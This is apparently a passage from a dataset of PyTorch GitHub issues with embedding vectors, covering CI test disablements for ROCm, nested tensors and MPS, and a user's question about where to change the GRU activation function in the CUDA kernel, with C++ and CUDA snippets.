  9.16452259e-02  4.09873873e-01  3.34996760e-01  1.89399540e-01
  3.39030385e-01 -9.48335081e-02  2.48382330e-01 -5.31817973e-01
  1.73853397e-01 -1.20288208e-01 -7.62675749e-03 -1.32904993e-03
 -4.12577614e-02  6.46216795e-02  4.25267547e-01 -2.71946102e-01
 -3.17045867e-01  1.74381763e-01 -1.24859467e-01  7.89041370e-02
  4.47744019e-02 -2.73854345e-01 -4.48683500e-01  2.27025717e-01
 -5.03754094e-02 -1.89030528e-01 -3.59020650e-01 -2.55340338e-01
  1.19431026e-01 -2.04935476e-01  1.35659069e-01 -9.73728448e-02
  9.20359343e-02  1.69523060e-01 -2.41339803e-01 -3.95404875e-01
  1.19665280e-01  1.13142088e-01 -4.53849472e-02 -2.34293193e-01
  4.71432544e-02  3.40102971e-01 -7.51891136e-02 -4.27500606e-01
 -2.11371094e-01 -2.86721110e-01  1.53429687e-01  1.49815068e-01
 -2.77611110e-02 -3.33212875e-03 -4.39675421e-01  1.98020667e-01
  2.64999121e-01 -1.24956198e-01 -4.54704203e-02 -1.92559868e-01
 -3.66649210e-01 -3.57604586e-02 -1.70014501e-01 -3.65919620e-02
 -1.14749745e-01 -1.13516815e-01  2.69673243e-02  1.35050893e-01
  2.01376498e-01 -1.77910909e-01  1.48051858e-01 -2.11059958e-01
 -1.90637559e-02 -2.24681750e-01 -6.76881522e-02 -1.26556337e-01
 -1.98991269e-01 -4.34282422e-01 -1.38495117e-01  6.63171113e-02
  2.46189952e-01  5.53929746e-01 -2.90257514e-01  1.43693924e-01
 -4.03686166e-01  1.20521873e-01 -2.25080512e-02 -3.62470374e-02
  2.91087776e-01  3.97769034e-01 -7.94911832e-02  2.32609004e-01
 -7.51896873e-02 -9.39700007e-02  1.09050572e-02 -1.41804144e-01
  1.96795762e-01  2.80378878e-01 -3.90634060e-01  5.77922404e-01
  4.42601651e-01  2.75475383e-01 -4.65758681e-01  1.12559646e-03
 -1.24442495e-01 -2.09789760e-02  1.63145050e-01 -4.52276886e-01
  1.53583854e-01 -4.51748446e-02  4.31322157e-01 -2.39915207e-01
  3.77511203e-01  1.15245339e-02 -1.77969903e-01  2.95616210e-01
  5.98783828e-02  1.34505332e-01 -2.15986058e-01  1.84437767e-01
  2.64967680e-01 -2.02869266e-01 -2.19695389e-01 -5.40372729e-01
 -2.94099569e-01  3.33449095e-02  1.48146957e-01  3.08264852e-01
  2.38510609e-01  1.82049751e-01 -2.37933278e-01 -1.95053652e-01
  4.88722958e-02  1.86771415e-02  1.85811967e-01 -3.21813188e-02
 -4.14280534e-01  9.50071216e-02  3.31335425e-01 -3.35973740e-01
 -3.21555912e-01 -3.09802592e-02 -3.55240256e-02  3.25119138e-01
  3.74182403e-01 -2.52518296e-01 -2.23762542e-03 -4.36061546e-02
  2.63684213e-01  2.64808804e-01  9.07313079e-02 -1.10789210e-01
 -1.38917968e-01  2.42328942e-01 -3.23306061e-02  1.53532743e-01
  4.03362691e-01 -7.57780671e-02 -1.55058622e-01  3.08062673e-01
  2.58118868e-01  1.90843105e-01 -5.10010421e-01 -2.48364627e-01
 -2.36497317e-02  2.85074264e-02  1.06632635e-01 -1.31348535e-01
 -2.84463465e-01  2.91756570e-01 -1.14771366e-01 -1.92642480e-01
 -1.47900328e-01  6.27927482e-01  1.14839889e-01 -5.09179473e-01
 -1.54133990e-01  3.18849057e-01  1.03104830e-01 -2.37599194e-01
 -1.47482544e-01  7.53679033e-03  4.15413141e-01  1.12889484e-01
 -2.79058337e-01  5.19655228e-01  2.57543381e-02  6.57167211e-02
  1.85820460e-02 -1.75418913e-01 -1.36384461e-02  4.13655341e-01
  1.67436257e-01 -1.33890182e-01  1.71209991e-01  1.12770773e-01
 -2.12506205e-02  8.89479369e-02 -3.77109945e-01  4.63607125e-02
  1.08873501e-01 -1.36123568e-01 -1.19399227e-01 -4.75067608e-02
  3.17232251e-01  9.29736868e-02 -4.15023386e-01  1.24127775e-01
 -1.48050293e-01 -1.88114196e-01  2.55557418e-01 -4.01718915e-01
  4.93316650e-01  4.07531708e-02 -4.98512015e-03  2.70934284e-01
  1.80117965e-01 -2.72660911e-01 -2.68540919e-01 -3.27173136e-02]"
UNSTABLE rocm / linux-focal-rocm5.6-py3.8 / test (default) module: rocm module: ci unstable ciflow/rocm,"ROCm job is broken after https://github.com/pytorch/pytorch/pull/111381.  AMD is looking into it (I assume).  Ping me if you want to revert.

cc @jeffdaily @sunway513 @jithunnair-amd @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang @seemethere @malfet @pytorch/pytorch-dev-infra",False,"[-1.46056265e-01 -1.75085604e-01 -6.76763877e-02 -1.62957221e-01
 -6.86646625e-02 -2.39044264e-01  4.02443707e-02  1.84514597e-01
 -5.10866284e-01 -1.04870498e-01  2.97232196e-02 -1.96169287e-01
 -1.83607772e-01  2.36063637e-03 -5.22799134e-01 -5.76634556e-02
 -2.11918741e-01 -2.98724443e-01  1.08198732e-01  2.13570278e-02
 -3.86026144e-01 -9.17163566e-02 -4.84755397e-01  1.28453486e-02
 -3.15251797e-01  5.37407041e-01  1.37102261e-01 -1.12724975e-01
  1.24955714e-01 -8.22973400e-02  7.42011219e-02  4.03504431e-01
  2.82412291e-01  1.16645113e-01  3.98079395e-01 -3.17203254e-02
 -3.07054818e-01 -2.90611386e-01  8.42980146e-02 -3.17202210e-01
  1.63192183e-01 -7.86671638e-02  1.22694582e-01  2.01602101e-01
 -5.42595349e-02 -9.36216265e-02  2.40347400e-01 -1.07663654e-01
  9.04572755e-03 -1.68957114e-01  1.36113480e-01 -3.60510265e-03
  1.26135975e-01 -2.99117029e-01 -1.18944861e-01 -6.71435446e-02
  4.13018316e-01  3.29756320e-01  8.68074298e-02  2.19369695e-01
  2.16585502e-01 -1.39602035e-01  9.87933278e-02  7.72520304e-02
  2.18217447e-01  1.94926381e-01  2.76029110e-01 -4.12202030e-01
  2.99967438e-01  2.20626861e-01 -2.85025001e-01 -2.12891787e-01
 -3.90620857e-01 -1.28364205e-01  3.48100185e-01  8.52202326e-02
  1.29699305e-01 -1.71868414e-01  4.38430011e-01  1.02058820e-01
  2.50276588e-02  6.58375695e-02 -1.42335728e-01 -3.68111491e-01
 -7.39864856e-02 -3.29975724e-01  1.09882608e-01 -2.02795476e-01
  2.00626701e-01 -3.82258967e-02  1.89351231e-01  2.23124206e-01
  2.54517253e-02  3.35128665e-01  9.67284143e-02  3.77613120e-03
 -1.95272118e-01  3.15590091e-02 -1.44348592e-01  1.35557249e-01
  1.04255881e-02  2.37837523e-01 -2.66221642e-01  2.46702537e-01
 -6.89726293e-01 -7.80948699e-02  6.47030249e-02 -1.47003487e-01
 -1.42559037e-01  4.30285335e-01  7.30762333e-02  2.87742205e-02
 -4.85628508e-02 -1.52758390e-01  2.05570161e-01  2.83666223e-01
 -1.80038065e-01 -3.26149166e-05 -4.53617632e-01  3.74047160e-01
 -3.18825901e-01 -5.25395572e-01 -1.08021624e-01 -5.92058785e-02
  1.31963223e-01 -3.38761955e-02 -7.65691549e-02 -4.63498160e-02
  6.41085953e-02  8.31073523e-02 -1.75910369e-02  2.02601612e-01
 -1.17838845e-01 -1.01269543e-01 -1.52675718e-01  4.61121142e-01
  1.23377144e-01 -1.60274535e-01  1.27952620e-01  3.58493447e-01
 -3.49211454e-01  3.53435099e-01 -1.94894493e-01 -2.68708169e-01
  2.60733128e-01 -2.17275828e-01 -3.07260603e-01 -2.19728813e-01
 -1.82031289e-01 -1.05252415e-01  1.13300368e-01 -3.47625673e-01
  3.54628712e-01  5.93450844e-01  2.44064718e-01  1.25911817e-01
  4.11351591e-01  5.25318496e-02  1.03400245e-01 -2.73066580e-01
 -3.09269667e-01  2.28598788e-01 -2.00257868e-01 -5.00502847e-02
  3.46029252e-01  3.21792439e-03 -2.46322453e-01  4.66401279e-02
 -1.42971039e-01  4.88317430e-01  1.91435352e-01  1.14973508e-01
  4.20885086e-01 -3.16563368e-01  1.68676719e-01 -3.22498590e-01
  7.51198083e-02  7.96930492e-02 -4.76182289e-02 -2.14410126e-02
  1.45756572e-01  8.33272040e-02  5.21548629e-01 -1.39827460e-01
 -2.42878199e-01  1.81516945e-01 -6.48939610e-02  2.56652594e-01
 -3.22866328e-02 -2.18877554e-01 -6.08569860e-01  4.17575866e-01
 -5.23720868e-02  1.93901435e-02 -2.14455858e-01 -6.74014464e-02
  1.93021119e-01 -1.66084021e-01 -4.72666062e-02  5.79053983e-02
  1.04089096e-01  2.02948868e-01 -3.52423906e-01 -1.63523197e-01
  3.06782484e-01  1.20796897e-01 -1.17852256e-01 -2.60106504e-01
 -2.41276652e-01  4.79022026e-01  1.70547262e-01 -3.75482380e-01
 -1.04438439e-01 -4.67255935e-02  2.54018568e-02  1.14739090e-01
  1.84728764e-04  4.46033590e-02 -3.75485718e-01 -1.75670475e-01
  3.35686833e-01  1.39584184e-01  2.78023779e-01 -9.31113288e-02
 -1.29344225e-01 -2.01964378e-01 -1.29141241e-01 -9.05139446e-02
 -2.32232541e-01 -2.38920785e-02  2.02920750e-01  4.57864344e-01
  8.23558941e-02 -2.15855911e-01  1.87594175e-01 -1.95799738e-01
  1.12867899e-01 -2.00748861e-01  4.24655192e-02 -1.37799233e-01
 -2.94761628e-01 -2.03275293e-01 -1.61451280e-01  1.83808267e-01
  3.98399770e-01  6.00717068e-01 -2.67510951e-01  1.88126698e-01
 -2.18446538e-01  1.49645984e-01 -2.58440375e-01 -2.19666064e-01
  1.14887848e-01  4.74979877e-01 -1.54509813e-01  1.72251672e-01
 -1.75028324e-01  2.50001192e-01 -9.74522233e-02 -1.07156537e-01
  1.44176662e-01  2.72335887e-01 -5.85827716e-02  2.90316969e-01
  3.23812395e-01  3.05036336e-01 -4.92733628e-01 -2.34045714e-01
 -9.13676396e-02 -1.87397331e-01 -4.13385257e-02 -4.98163998e-01
  1.43630534e-01 -1.76321611e-01  1.84029520e-01 -2.81949222e-01
  4.34109867e-01  1.98035575e-02 -2.23378390e-01  2.34041423e-01
 -1.23518646e-01  3.22925746e-02 -2.82688379e-01  2.92358875e-01
  5.13713956e-01 -2.75685877e-01  5.05919531e-02 -4.73440170e-01
 -1.07678935e-01 -1.52385324e-01  2.71699816e-01  7.56685734e-02
  3.74915957e-01  1.33381248e-01 -1.01992190e-01  8.92838612e-02
  1.47070855e-01  2.58499563e-01  2.86782265e-01 -3.28765333e-01
 -1.25029519e-01 -1.18831709e-01  1.96087640e-02  5.11726066e-02
 -3.63719970e-01 -3.47005203e-02 -2.15010166e-01  9.93244201e-02
  3.30277562e-01 -1.48536325e-01  1.01640083e-01  4.08853590e-03
  8.56851786e-02  2.00114369e-01 -2.45517254e-01 -1.80622563e-01
 -2.04736039e-01  1.49065495e-01 -1.04322612e-01  6.92826286e-02
  1.56153679e-01 -2.78652310e-01  1.49203449e-01  5.80734909e-02
  3.33353609e-01  2.32370555e-01 -4.29188460e-01 -4.58352447e-01
 -2.39037156e-01 -2.58058399e-01  3.07508111e-01 -1.10122688e-01
  1.82255469e-02  2.94514179e-01 -2.19511330e-01  1.39197841e-01
 -1.48274481e-01  3.69342864e-01  1.35486096e-01 -4.03466165e-01
 -1.83122814e-01  6.55013919e-02  1.90785110e-01 -1.91377953e-01
 -1.27992511e-01  1.76431537e-01  3.89184654e-01  1.62885606e-01
 -2.37701595e-01  2.99499750e-01 -2.33073831e-01  1.01237252e-01
  1.82602406e-01 -2.03589723e-01 -2.79721975e-01  4.14017051e-01
  4.80289817e-01 -9.89636481e-02 -2.93421865e-01  1.96589112e-01
  4.99686413e-02  1.84929185e-02 -4.37322617e-01 -1.49913952e-01
  6.01323787e-03 -2.37749487e-01  1.47160470e-01  9.39915553e-02
 -7.37434104e-02  7.62542635e-02 -6.81129321e-02  1.51422799e-01
 -1.11779599e-02  2.73116268e-02  2.49373123e-01 -3.84903938e-01
  2.54865289e-01  3.47621918e-01 -3.01893950e-01  4.92082924e-01
  6.26880601e-02 -1.03865184e-01 -8.94652009e-02 -9.42512304e-02]"
DISABLED test_detach_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_detach_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17831419866).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_detach_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305",False,"[-0.36225528  0.02945914 -0.23923557 -0.10706723 -0.02100044 -0.39805222
  0.07410303  0.17775634 -0.31882155 -0.16216868  0.31245315 -0.18182532
  0.2979923   0.10650374 -0.03200614 -0.10980533 -0.1766497  -0.09909377
  0.4657173   0.11460382 -0.26139402  0.08702617 -0.33453506  0.2207767
  0.17305517 -0.00961962 -0.15932222 -0.03049411  0.0735995   0.10430036
  0.23882191  0.09338642 -0.31906772  0.03257217  0.53594357  0.16855568
 -0.18967634 -0.14932501 -0.28672278 -0.11083858  0.24367906  0.05096705
  0.04693706 -0.20434037  0.24884626 -0.01412453 -0.18576135  0.23423868
 -0.23501313 -0.02196416  0.17889677 -0.07835568  0.01701748 -0.35170937
  0.01035173 -0.17618215  0.11442815  0.32130653  0.04568148  0.16472563
  0.12092247  0.0577203  -0.09108718 -0.10887526 -0.09364364  0.06982242
  0.247765   -0.30044824  0.5398288  -0.15457475  0.13991196 -0.00151465
 -0.31244457 -0.04489857  0.17780608  0.18273894 -0.2439641   0.0504363
 -0.10999311 -0.07111339 -0.09153086 -0.06173052  0.03802364  0.04413019
  0.22902396 -0.01685425  0.08276063 -0.03215371  0.2059071  -0.16210172
  0.19591694  0.27007306 -0.12685774  0.00921123 -0.17393123 -0.02511679
  0.32379258 -0.1318741  -0.32661462  0.19642225  0.1305202  -0.4280753
 -0.21379718  0.30451322 -0.1156884  -0.22779432  0.5269261   0.04382892
  0.06923239 -0.23092581  0.09729439  0.04324344  0.01319531  0.04089991
  0.0854217  -0.06111722 -0.17274657 -0.14084058 -0.05913529  0.482245
 -0.21794784 -0.10080524  0.10059175 -0.03342079  0.34645736  0.03072058
 -0.10008322 -0.01006902  0.1452111  -0.00073568  0.03698804  0.10638821
 -0.2818033  -0.1321525   0.15808167  0.12002435 -0.18304172 -0.24847817
  0.04435131  0.06068535 -0.1302667   0.02916984  0.04148684 -0.24206963
  0.2567082   0.09672289 -0.06735944  0.11778306 -0.0904624   0.02477444
  0.07235153  0.0474479   0.21921593  0.44019103 -0.08516023 -0.02758868
  0.39545757  0.16751152  0.12841904 -0.08378491 -0.10838314  0.47767243
 -0.01788793  0.0298607   0.3094051  -0.11430065 -0.482353    0.06779167
 -0.02887854  0.1834979  -0.14741482 -0.05608959  0.17900315 -0.1536088
 -0.0480658  -0.09378991  0.27807552 -0.32170355 -0.01251243  0.24691775
 -0.02374896  0.06405848  0.12435727  0.11893436 -0.04659535  0.10872237
  0.214825   -0.1068027   0.12184503 -0.0044667  -0.5498619  -0.23715606
  0.03971796 -0.05489045 -0.22007984 -0.26626357  0.00097121 -0.08590347
  0.03508659 -0.01006486 -0.14452729  0.35372216  0.2051065  -0.07249777
  0.07074028  0.1654595  -0.09767711 -0.44408327  0.16799906  0.05005558
 -0.22796457 -0.06835087 -0.16590975 -0.34288058  0.01467435 -0.03746163
 -0.03212383 -0.05080724  0.01916694  0.26973474 -0.28619272 -0.22540087
 -0.17597017 -0.11761716 -0.29982245 -0.07348166 -0.30833095  0.24878024
 -0.02874015 -0.0988716  -0.07443918 -0.2607423   0.1452834  -0.03240738
  0.34654105 -0.2630832  -0.35489476 -0.05304767 -0.00298927  0.43120992
 -0.49902463 -0.54718614 -0.10885496  0.08235225 -0.03492578  0.06188296
  0.08235339 -0.11914603 -0.22025159  0.10702855 -0.16528681 -0.2919101
  0.31201586 -0.003013    0.15629128  0.43154818 -0.0929096   0.07210539
 -0.03259015 -0.00881609 -0.0248087   0.36877483 -0.12481204  0.25418746
  0.1358423   0.09596203 -0.20742986  0.11245028  0.05410729 -0.16667065
  0.5347209  -0.465766    0.09009191  0.14950216  0.31107056 -0.30843014
  0.3532917   0.149272   -0.02672597 -0.10463494  0.2344658   0.11214552
 -0.07891873 -0.13162462  0.22242445 -0.26798812 -0.1551379  -0.08431412
 -0.256693   -0.0716652  -0.09409961  0.1516101   0.02848399 -0.01492231
 -0.40970722 -0.07214389  0.2918686  -0.3054418   0.10243923 -0.11226784
 -0.20522204 -0.05119491  0.17181526 -0.3271757  -0.01376901 -0.08766686
  0.12007746  0.02653482  0.4367154  -0.42935866  0.0786502   0.13015
 -0.13887782  0.27443781  0.03989512  0.01255704 -0.22218731  0.30883116
  0.11330278  0.20389591  0.2706086  -0.12477323 -0.3810716   0.13001978
  0.14680213  0.05618624 -0.29208982 -0.09782386 -0.04894801  0.0357489
 -0.10931616 -0.11150276 -0.15375784 -0.20595454 -0.03070758 -0.08141905
 -0.09732159  0.43593484  0.01392342 -0.19963469  0.10631286 -0.07178686
  0.07369752 -0.36987743 -0.13082486 -0.05069355  0.22209172  0.18226185
  0.23581009  0.05456831 -0.06791152  0.03287496 -0.22897774 -0.10437827
  0.10515574  0.51427805  0.07023701  0.06101307  0.34961057  0.50139254
 -0.19423616  0.05890368 -0.4237708  -0.3058256   0.19130692 -0.09971201
 -0.03642717  0.02180856  0.07347685  0.27510065 -0.47694048  0.15219061
 -0.11046563  0.36536095  0.17141998 -0.03548929  0.27402583 -0.22696397
  0.07413441  0.0150595  -0.11177005  0.13708663  0.10812639  0.13331872]"
Implementation Of SeLU in New Gate of GRU with CUDA - PyTorch Source ,"I want to change the activation function in GRU architecture i.e. For newgate i wanted to replace tanh with selu activation function, somehow i successfully did it by changing file RNN.cpp in aten/src/ATen/native/Rnn.cpp, but on testing i found that it was only working on CPU not for the GPU. On Cuda input it was generating the same output as with tanh. Can someone help me to find the actual file where the cuda implementation of GRU lies. Here is the modified struct used in RNN.cpp that is working on CPU only

```
Tensor applySelu(Tensor new_gate)
  {
    torch::Tensor input = (torch::Tensor) new_gate;
    torch::Tensor result = torch::selu(input);
    const Tensor result_return = (Tensor) result;
    return result_return;
  }

template <typename cell_params>
struct GRUCell : Cell<Tensor, cell_params> {
  using hidden_type = Tensor;

  hidden_type operator()(
      const Tensor& input,
      const hidden_type& hidden,
      const cell_params& params,
      bool pre_compute_input = false) const override {
    if (input.is_cuda() || input.is_xpu()) {
      TORCH_CHECK(!pre_compute_input);
      auto igates = params.matmul_ih(input);
      auto hgates = params.matmul_hh(hidden);
      auto result = at::_thnn_fused_gru_cell(
          igates, hgates, hidden, params.b_ih(), params.b_hh());
      // Slice off the workspace argument (it's needed only for AD).
      return std::move(std::get<0>(result));
    }
    const auto chunked_igates = pre_compute_input
        ? input.unsafe_chunk(3, 1)
        : params.linear_ih(input).unsafe_chunk(3, 1);
    auto chunked_hgates = params.linear_hh(hidden).unsafe_chunk(3, 1);
    const auto reset_gate =
        chunked_hgates[0].add_(chunked_igates[0]).sigmoid_();
    const auto input_gate =
        chunked_hgates[1].add_(chunked_igates[1]).sigmoid_();
    const auto new_gate =
        chunked_igates[2].add(chunked_hgates[2].mul_(reset_gate));
    const auto test_gate = applySelu(new_gate);
    return (hidden - test_gate).mul_(input_gate).add_(test_gate);
  }
};
```

I also found a cuda file named RNN.cu in aten/src/ATen/native/cuda/RNN.cu, also modified it with selu but didn't get the relevant output.Here is the code from that file.

```
template<typename T>
__device__ __forceinline__
T selu(T x) {
  T alpha = static_cast<T>(1.67326);
  T scale = static_cast<T>(1.0507);
  return (x > 0) ? (scale * x) : (scale * alpha * (::exp(x) - static_cast<T>(1)));
}


template <typename scalar_t, typename accscalar_t, typename index_type, int indexing_kind>
#if __CUDA_ARCH__ >= 350 || defined(USE_ROCM)
C10_LAUNCH_BOUNDS_2(512, 4)
#endif
__global__ void gru_cell_forward(
            TensorInfo<scalar_t, index_type> Input,
            TensorInfo<scalar_t, index_type> Hidden,
            TensorInfo<scalar_t, index_type> Bias1,
            TensorInfo<scalar_t, index_type> Bias2,
            TensorInfo<scalar_t, index_type> _hx,
            TensorInfo<scalar_t, index_type> _hy,
            TensorInfo<scalar_t, index_type> storage,
            index_type hsz,
            index_type totalElements) {
  bool has_bias = Bias1.data != nullptr;
  for (index_type linearIndex = blockIdx.x * blockDim.x + threadIdx.x;
       linearIndex < totalElements;
       linearIndex += gridDim.x * blockDim.x) {
      index_type offset = (linearIndex/hsz)*3*hsz+linearIndex%hsz;

      scalar_t ir = DEVICE_LINEAR_GET(Input, offset+0*hsz);
      scalar_t ii = DEVICE_LINEAR_GET(Input, offset+1*hsz);
      scalar_t in = DEVICE_LINEAR_GET(Input, offset+2*hsz);
      scalar_t hr = DEVICE_LINEAR_GET(Hidden,offset+0*hsz);
      scalar_t hi = DEVICE_LINEAR_GET(Hidden,offset+1*hsz);
      scalar_t hn = DEVICE_LINEAR_GET(Hidden,  offset+2*hsz);

      scalar_t hx = DEVICE_LINEAR_GET(_hx, linearIndex);
      scalar_t* hy = &DEVICE_LINEAR_GET(_hy, linearIndex);

      scalar_t b1r, b1i, b1n, b2r, b2i, b2n;

      if (has_bias) {
        b1r = DEVICE_BIAS_GET(Bias1, linearIndex%hsz+0*hsz);
        b1i = DEVICE_BIAS_GET(Bias1, linearIndex%hsz+1*hsz);
        b1n = DEVICE_BIAS_GET(Bias1, linearIndex%hsz+2*hsz);

        b2r = DEVICE_BIAS_GET(Bias2, linearIndex%hsz+0*hsz);
        b2i = DEVICE_BIAS_GET(Bias2, linearIndex%hsz+1*hsz);
        b2n = DEVICE_BIAS_GET(Bias2, linearIndex%hsz+2*hsz);
      } else {
#ifndef THC_REAL_IS_HALF
        b1r = 0.0; b1i = 0.0; b1n = 0.0;
        b2r = 0.0; b2i = 0.0; b2n = 0.0;
#else
        b1r = F2H(0.0); b1i = F2H(0.0); b1n = F2H(0.0);
        b2r = F2H(0.0); b2i = F2H(0.0); b2n = F2H(0.0);
#endif
      }

      offset = (linearIndex/hsz)*5*hsz+linearIndex%hsz;

      accscalar_t rg, ig, ng;

      rg = sigmoid(H2F(ir) + H2F(hr) + H2F(b1r) + H2F(b2r));
      ig = sigmoid(H2F(ii) + H2F(hi) + H2F(b1i) + H2F(b2i));

      ng = H2F(in) + H2F(b1n) + rg*( H2F(hn)+H2F(b2n) );
      
      //ng = ::tanh(ng);
      ng = selu(ng);
      *hy = F2H( ng + ig * ( H2F(hx)-ng ) );

      //SAVE FOR BACKWARDS
      DEVICE_LINEAR_GET(storage, offset+0*hsz) = F2H(rg);
      DEVICE_LINEAR_GET(storage, offset+1*hsz) = F2H(ig);
      DEVICE_LINEAR_GET(storage, offset+2*hsz) = F2H(ng);
      DEVICE_LINEAR_GET(storage, offset+3*hsz) = hx;
      DEVICE_LINEAR_GET(storage, offset+4*hsz) = F2H(H2F(hn) + H2F(b2n));
    }
}
```

- I have Applied the print statements in the first RNN.cpp file got to know that if condition is not being true on GPU as well.

- Even the modified cuda file is not being invoked as per my understanding because the output is same as on default architecture with tanh.",False,"[-0.4186692  -0.1805587  -0.38808143  0.00704788 -0.15939532  0.03108618
  0.02992627  0.13010529 -0.07378285 -0.11736929  0.13382491  0.21727902
  0.0073839  -0.11571591 -0.40440786 -0.13200808 -0.22570448  0.1319755
  0.06866901 -0.3773947  -0.25889945  0.04351518 -0.01821453 -0.2453708
 -0.02289014 -0.1034272   0.21942851 -0.22685763  0.15973397 -0.01875391
  0.2346895   0.06544259  0.01217153  0.2864204   0.02358369 -0.13530888
 -0.05731587 -0.19669065  0.07434504 -0.21521267  0.15060228 -0.0849549
 -0.07489714 -0.24481724  0.20478767 -0.16084787 -0.02547832  0.09475896
 -0.24991283 -0.04080691  0.44538417  0.2979045  -0.02221042 -0.15653464
  0.19212082  0.14146541  0.00931322  0.6041595  -0.00985996  0.16413528
  0.32821435  0.10059863 -0.0050222   0.09293015  0.11460922 -0.30057752
  0.0549817  -0.20941374  0.4530208  -0.27218324 -0.40083653  0.14986458
  0.11685308 -0.58406913  0.05576624  0.2486136  -0.2264509   0.31477237
 -0.13840783 -0.3350771   0.4004202   0.4653388   0.03366102 -0.26307425
  0.14338169  0.3203907   0.1197508  -0.5134039   0.0061626  -0.10594951
  0.23071225 -0.16778135 -0.01604421 -0.05636342  0.01975114  0.00795888
 -0.19989997  0.01047496  0.18673414 -0.25912404 -0.15505955 -0.20374596
 -0.08323826  0.27132726 -0.15254709 -0.30146125  0.08268508  0.28025478
 -0.04283177 -0.11256418  0.389529    0.14638916  0.08139646  0.04910771
  0.09968382  0.2775398   0.09799691  0.10407372 -0.03504507  0.3340397
 -0.10009506 -0.2906866  -0.28056347 -0.00619603 -0.234309    0.23037241
  0.01179103 -0.11778922 -0.03681274  0.24065892  0.11883011 -0.23623902
  0.06872687 -0.20541148 -0.03371143  0.2361001  -0.24839231  0.10875124
 -0.27976248 -0.10087061  0.10962123 -0.11556266  0.10985578  0.02915059
 -0.31119627 -0.14357355  0.29438844  0.05413666  0.00909332  0.31292638
  0.05930218 -0.19313654 -0.01959884  0.17455775  0.04403814 -0.05249136
  0.16271728 -0.01774022 -0.05786096 -0.12057985  0.07139324  0.22538593
 -0.26195621 -0.04505434  0.22745025  0.16049358  0.07689735  0.04533938
 -0.09122287  0.13720798  0.14156252 -0.10715991  0.08232288 -0.28452095
  0.02811431 -0.03303321  0.25046688  0.03696917 -0.17045149  0.145186
  0.01164513  0.0404681   0.20833445 -0.1857926   0.04920838  0.11567701
  0.3925603   0.23810758 -0.36883858  0.0129126  -0.30311027  0.1511353
 -0.14552675 -0.00592976 -0.16370477 -0.3073457  -0.20054781  0.11835475
 -0.1931445   0.24305058 -0.1809243  -0.27294332  0.14946358  0.08042362
 -0.16149116  0.23518248 -0.40186667 -0.12589732  0.01857742  0.16709267
  0.03324046 -0.08954915 -0.3467248  -0.1384297  -0.18468308 -0.00356389
  0.08574178 -0.11201075  0.06382446  0.33455372  0.60098773 -0.19626802
  0.3842316   0.00269422  0.19609632  0.09793366 -0.07564221 -0.12014427
 -0.06179584  0.06845734 -0.06575727 -0.14589158 -0.21450758  0.01860005
  0.37775627 -0.04693741 -0.00441407  0.02506131 -0.18829302  0.22673565
 -0.45362037  0.06479548 -0.21988751 -0.06809578  0.08608843  0.16230308
  0.0773873   0.16870528  0.14253154 -0.4115489   0.3002063  -0.07419953
  0.03237288  0.08339179  0.09058056  0.0621676  -0.24411947  0.24985081
 -0.13225654 -0.01799545  0.35513598  0.43230617 -0.04248991  0.33847553
  0.11511435  0.05048313 -0.00279693  0.2248475  -0.07743001  0.00900223
 -0.20095691 -0.09383966 -0.16803099 -0.11068287  0.19400409 -0.15134248
  0.19279587 -0.35106027  0.14688164  0.23572844  0.3405642   0.05829208
 -0.26186866 -0.27862164  0.1898619  -0.07195307 -0.28653878 -0.01632516
 -0.21960458 -0.35678056 -0.09699581  0.11498329  0.02031428 -0.22155741
 -0.13091087  0.0753575   0.26154593  0.11859722 -0.13454589 -0.39644042
 -0.091631   -0.16071902 -0.14366376  0.2114262  -0.1891475  -0.10331275
 -0.07164271 -0.1434848   0.50621986  0.21339189  0.09662592  0.36411935
  0.19897857  0.09343909 -0.44622588  0.02135953 -0.08571747 -0.07822601
  0.18701082  0.207464   -0.29817402 -0.534328   -0.2838586   0.1876538
  0.1869948   0.13541275 -0.28779045  0.07797922 -0.02498641  0.21172455
 -0.06148799  0.2724658   0.08707573  0.14743531 -0.22686327  0.23232935
  0.13275464 -0.12534532  0.16079915 -0.01736402 -0.17121178 -0.15483148
 -0.34255028 -0.1719346  -0.08030711 -0.2752151  -0.13037623  0.250786
 -0.03239475 -0.20447874 -0.14098778 -0.03791001  0.04930571  0.19771002
  0.0784274   0.2563952   0.24363904  0.15241778  0.03240626  0.14110093
 -0.12838997  0.13627337  0.04659044 -0.25803652 -0.11309654 -0.05105967
  0.13293707 -0.07624862  0.12758277  0.28773725 -0.32125312  0.23888229
 -0.02855664  0.09632349  0.1873813  -0.28065187 -0.0945375  -0.07799564
  0.1221185   0.2298559  -0.08970481  0.20012277  0.01627321 -0.11453746]"
DISABLED test_check_inplace_nn_CELU_mps_float32 (__main__.TestModuleMPS) triaged module: macos skipped module: mps,"Platforms: mac, macos

This test was disabled because it is failing on main branch ([recent examples](http://torch-ci.com/failure/test_modules.py%3A%3ATestModuleMPS%3A%3Atest_check_inplace_nn_CELU_mps_float32)).

This test has been failing in MacOS x86 for a while https://hud.pytorch.org/pytorch/pytorch/commit/973c87b320b5e7489f18b719d5b1c57a2051ae10.  The error is:

```
RuntimeError: MPS backend out of memory (MPS allocated: 0 bytes, other allocations: 0 bytes, max allowed: 1.70 GB). Tried to allocate 0 bytes on private pool. Use PYTORCH_MPS_HIGH_WATERMARK_RATIO=0.0 to disable upper limit for memory allocations (may cause system failure).
```

cc @kulinseth @albanD @malfet @DenisVieriu97 @razarmehr @abhudev",False,"[-1.86132099e-02 -1.62162036e-01  3.18422578e-02 -1.30952783e-02
  4.49228138e-02 -2.03889757e-01  2.27057338e-01 -9.03813168e-02
 -4.45214987e-01 -3.16611469e-01  3.73799622e-01 -3.99623960e-01
